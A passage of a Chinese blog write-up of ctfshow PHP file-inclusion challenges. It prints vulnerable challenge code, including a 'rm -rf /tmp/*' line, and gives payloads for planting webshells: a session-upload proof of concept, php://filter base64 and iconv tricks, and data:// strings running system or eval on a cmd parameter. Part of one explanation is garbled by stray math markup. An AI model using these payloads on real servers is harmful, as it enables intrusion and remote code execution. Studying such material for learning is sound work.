<span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"hidden"</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="token assign-left variable">value</span><span class="token operator">=</span><span class="token string">"2333"</span> /<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"file"</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"file"</span> /<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"submit"</span> <span class="token assign-left variable">value</span><span class="token operator">=</span><span class="token string">"submit"</span> /<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/form<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>?php
session_start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
?<span class="token operator">&gt;</span>
</code></pre> 
<h3><a id="WEB_84_323"></a>WEB 84</h3> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rm -rf /tmp/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>法1：<br> 待补充</p> 
<p>法2：</p> 
<pre><code class="prism language-bash"><span class="token comment">#poc.php</span>
<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>form <span class="token assign-left variable">action</span><span class="token operator">=</span><span class="token string">"ip地址"</span> <span class="token assign-left variable">method</span><span class="token operator">=</span><span class="token string">"POST"</span> <span class="token assign-left variable">enctype</span><span class="token operator">=</span><span class="token string">"multipart/form-data"</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"hidden"</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="token assign-left variable">value</span><span class="token operator">=</span><span class="token string">"2333"</span> /<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"file"</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"file"</span> /<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"submit"</span> <span class="token assign-left variable">value</span><span class="token operator">=</span><span class="token string">"submit"</span> /<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/form<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>?php
session_start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
?<span class="token operator">&gt;</span>
</code></pre> 
<h3><a id="WEB_85_362"></a>WEB 85</h3> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>法1：<br> 待补充</p> 
<p>法2：</p> 
<pre><code class="prism language-bash"><span class="token comment">#poc.php</span>
<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>form <span class="token assign-left variable">action</span><span class="token operator">=</span><span class="token string">"ip地址"</span> <span class="token assign-left variable">method</span><span class="token operator">=</span><span class="token string">"POST"</span> <span class="token assign-left variable">enctype</span><span class="token operator">=</span><span class="token string">"multipart/form-data"</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"hidden"</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="token assign-left variable">value</span><span class="token operator">=</span><span class="token string">"2333"</span> /<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"file"</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"file"</span> /<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"submit"</span> <span class="token assign-left variable">value</span><span class="token operator">=</span><span class="token string">"submit"</span> /<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/form<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>?php
session_start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
?<span class="token operator">&gt;</span>
</code></pre> 
<h3><a id="WEB_86_407"></a>WEB 86</h3> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 21:20:43
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'还要秀？'</span><span class="token punctuation">,</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">set_include_path</span><span class="token punctuation">(</span>还要秀？<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>法1：<br> 待补充</p> 
<p>法2：</p> 
<pre><code class="prism language-bash"><span class="token comment">#poc.php</span>
<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>form <span class="token assign-left variable">action</span><span class="token operator">=</span><span class="token string">"ip地址"</span> <span class="token assign-left variable">method</span><span class="token operator">=</span><span class="token string">"POST"</span> <span class="token assign-left variable">enctype</span><span class="token operator">=</span><span class="token string">"multipart/form-data"</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"hidden"</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="token assign-left variable">value</span><span class="token operator">=</span><span class="token string">"2333"</span> /<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"file"</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"file"</span> /<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"submit"</span> <span class="token assign-left variable">value</span><span class="token operator">=</span><span class="token string">"submit"</span> /<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/form<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>?php
session_start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
?<span class="token operator">&gt;</span>
</code></pre> 
<h3><a id="WEB_87_459"></a>WEB 87</h3> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;?php die('大佬别秀了');?&gt;"</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>法1：<br> web87解法 详解 if(isset($_GET[‘file’])){ $file = $_GET[‘file’]; （当出现post的时候，主体跟着post走） $content = $_POST[‘content’]; （这里表明了是content参数，不是php://file那个的convert） $file = str_replace(“php”, “???”, $file); $file = str_replace(“data”, “???”, $file); $file = str_replace(“:”, “???”, $file); $file = str_replace(“.”, “???”, <span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         f 
        
       
         i 
        
       
         l 
        
       
         e 
        
       
         ) 
        
       
         ; 
        
       
         f 
        
       
         i 
        
       
         l 
        
        
        
          e 
         
        
          p 
         
        
       
         u 
        
        
        
          t 
         
        
          c 
         
        
       
         o 
        
       
         n 
        
       
         t 
        
       
         e 
        
       
         n 
        
       
         t 
        
       
         s 
        
       
         ( 
        
       
         u 
        
       
         r 
        
       
         l 
        
       
         d 
        
       
         e 
        
       
         c 
        
       
         o 
        
       
         d 
        
       
         e 
        
       
         ( 
        
       
      
        file); file_put_contents(urldecode( 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.0361em; vertical-align: -0.2861em;"></span><span class="mord mathnormal" style="margin-right: 0.1076em;">f</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right: 0.0197em;">l</span><span class="mord mathnormal">e</span><span class="mclose">)</span><span class="mpunct">;</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord mathnormal" style="margin-right: 0.1076em;">f</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right: 0.0197em;">l</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.1514em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2861em;"><span class=""></span></span></span></span></span></span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.1514em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right: 0.0278em;">r</span><span class="mord mathnormal" style="margin-right: 0.0197em;">l</span><span class="mord mathnormal">d</span><span class="mord mathnormal">eco</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mopen">(</span></span></span></span></span>file), “”.$content); （二次url编码，因为第一次编码过去之后自动解码（中间件自动解码），但是他这里还要解码一次，因为写函数了） （content是写入内容,要进行base64编码 对应上面的伪协议解码,而base解码时,是4个一组,flag.php(要写入的文件),写入的内容中只有phpdie会参与base64解码,因为phpdie只有6个字节,补两个a就是8字节了）（aaPD9waHAgc3lzdGVtKCdscycpOz8+）aa是补给前面的 （结果就是phpdieaaPD9waHAgc3lzdGVtKCdscycpOz8+（四个一组）） }else{ highlight_file(FILE); }</p> 
<p>注意不一定非要用base64 ?file=php://filter/write=string.rot13/resource=5.php string.rot13 ：应用 ROT13 编码（字符替换算法）。（两次加密就会把原文弄出来） file_put_contents file_put_contents函数把一个字符串写入文件中。例如file_put_contents(“sites.txt”,“Runoob”);把run写入txt file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )</p> 
<p>“”.$content $str1 = “Hello”; $str2 = “World”; $newStr = $str1 . $str2; // 结果为 “HelloWorld”</p> 
<p>Get和post对比</p> 
<p>法2：<br> https://www.leavesongs.com/PENETRATION/php-filter-magic.html https://xz.aliyun.com/t/8163#toc-3 php://filter/write=string.rot13/resource=2.php</p> 
<p>%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%2<br> 5%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%<br> 33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36<br> %32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%3<br> 3%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%<br> 25%37%32%25%36%33%25%36%35%25%33%64%25%33%33%25%32%65%25%37%30%25%36%38%25%37%30<br> 因为通过base64过滤之后就只有(phpdie)6个字符我们就要添加2个字符让前面的可以进行编码</p> 
<p>法3：<br> 常规的死亡exit，用二次编码绕过替换，我的构造方法是先手动编码一次，然后再次对%进行编码，构造出来：/?file=%2570%68%70%253a//filter/write=convert%252ebase64-decode/resource=shell%252e%70%2568%70</p> 
<p>提交内容为 ------WebKitFormBoundaryxxjx0zR0LaGW5ZOW Content-Disposition: form-data; name=“content”</p> 
<p>ppPD9waHAgcGhwaW5mbygpO2V2YWwoJF9HRVRbJ2NtZCddKTs/Pg== 这里的pp是加上去的，凑够两字符即可，但不能用=，因为=是结尾凑倍数的，开头不能用。</p> 
<h3><a id="WEB_88_504"></a>WEB 88</h3> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>法1：<br> 发现过滤的还是比较多，但是没有过滤 : 那我们就可以使用PHP伪协议就是 这里使用的是 data://text/plain;base64,poc 其实和79差不多 只是注意的是编码成base64的时候要去掉 ＝</p> 
<p>法2：<br> data://text/plain;base64,PD9waHAgZXZhbCgkX0dFVFsnY21kJ10pO3BocGluZm8oKTskX0dFVDs/PjEx&amp;cmd=system(‘tac+fl0g.php’);</p> 
<p>主要是data协议构造base64的时候必须要求不含=和+号，多试几次构造一下，在结尾?&gt;后添加字符消除=</p> 
<h3><a id="WEB_116_526"></a>WEB 116</h3> 
<p>视频</p> 
<p>法1：<br> 搜索PNG找到89开头的那个，再搜索IEDN直到82结束，导出png，分析源码<br> 发现file变量可以包含，直接尝试?file=/flag.php得到flag</p> 
<h3><a id="WEB_117_532"></a>WEB 117</h3> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i'</span><span class="token punctuation">,</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contents'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;?php die();?&gt;"</span><span class="token operator">.</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>法1：<br> payload: file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php post:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?</p> 
<p>法2：<br> 正则没有过滤filter协议，仍然通过filter协议绕过死亡exit ?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php<br> post的contents内容 ?&lt;hp pvela$(G_TE’[mc’d)]?;&gt;&gt; 多一个&gt;是为了防止报错，&gt;在标签外不解析<br> 会生成shell.php，密码为cmd，可以拿到flag</p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/93f847eef151a6281c1edb48c7379289/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">【已解决】Pyecharts折线图，只有坐标轴没有折线数据</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/f11b1a332f38918e82ab41faf0dcface/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">春日旅游路线</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>